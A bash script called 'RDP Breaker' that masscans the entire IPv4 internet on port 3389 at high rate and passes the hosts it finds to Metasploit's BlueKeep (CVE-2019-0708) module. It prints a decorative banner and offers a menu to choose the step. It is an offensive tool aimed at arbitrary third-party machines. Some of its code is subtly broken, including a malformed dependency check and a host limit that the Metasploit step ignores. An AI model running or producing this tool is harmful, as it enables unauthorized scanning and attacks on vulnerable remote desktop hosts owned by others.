#!/bin/bash

# Check if pyfiglet and colorama are installed
if ! command -v pyfiglet &>/dev/null || ! command -v python -m colorama &>/dev/null; then
    echo "Error: pyfiglet and/or colorama are not installed. Please install them using 'pip install pyfiglet colorama'."
    exit 1
fi

# Display the "RDP Breaker" text in ASCII art style with colors
python - <<'EOF'
import pyfiglet
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# Define the ASCII art font style
font = 'slant'

# Create the ASCII art
ascii_text = pyfiglet.figlet_format("RDP Breaker", font=font)

# Print the ASCII art with colored text
print(Fore.CYAN + ascii_text)
EOF

read -p "Enter the number of RDP hosts you want to fetch: " num_rdp_hosts

echo "Select the tool you want to use:"
echo "1: masscan"
echo "2: metasploit"

read -p "Enter the number corresponding to your choice: " tool_choice

if [ "$tool_choice" = "1" ]; then
    read -p "Enter the file name to save masscan results (e.g., rdp_masscan.txt): " masscan_file
    masscan -p3389 0.0.0.0/0 --rate 10000 -oG $masscan_file
    grep -oP '(?<=Host: )\S+' $masscan_file | head -n $num_rdp_hosts > rdp.txt

elif [ "$tool_choice" = "2" ]; then
    read -p "Enter the file name containing the list of RDP hosts (e.g., rdp.txt): " rdp_file

    if [ -s "$rdp_file" ]; then
        echo "Running Metasploit BlueKeep exploit on the first $num_rdp_hosts hosts from $rdp_file..."
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS file:$rdp_file; run"
    else
        echo "Error: The specified file does not exist or is empty."
    fi

else
    echo "Invalid choice. Please enter either '1' or '2' corresponding to your choice."
fi

